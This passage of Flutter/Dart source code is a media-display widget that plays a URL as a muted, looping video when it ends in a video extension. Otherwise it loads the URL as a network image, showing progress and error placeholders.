    super.initState();
    if (_isVideo(widget.url)) {
      _ctrl = VideoPlayerController.networkUrl(Uri.parse(widget.url))
        ..initialize().then((_) {
          if (mounted) setState(() {});
          _ctrl?.setLooping(true);
          _ctrl?.setVolume(0);
          _ctrl?.play();
        });
    }
  }

  bool _isVideo(String url) => url.endsWith('.mp4') || url.endsWith('.webm') || url.endsWith('.mov') || url.endsWith('.mkv');

  @override
  void dispose() { _ctrl?.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    if (_isVideo(widget.url)) {
      if (_ctrl?.value.isInitialized == true) return AspectRatio(aspectRatio: _ctrl!.value.aspectRatio, child: VideoPlayer(_ctrl!));
      return Container(color: _C.surface, child: const Center(child: SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: _C.redMid))));
    }
    return Image.network(
      widget.url,
      fit: BoxFit.cover,
      loadingBuilder: (_, child, progress) => progress == null ? child : Container(color: _C.surface, child: Center(child: CircularProgressIndicator(value: progress.expectedTotalBytes != null ? progress.cumulativeBytesLoaded / progress.expectedTotalBytes! : null, strokeWidth: 2, color: _C.redMid))),
      errorBuilder: (_, __, ___) => Container(color: _C.surface, child: const Icon(Icons.broken_image_outlined, color: _C.textDim, size: 32)),
    );
  }
}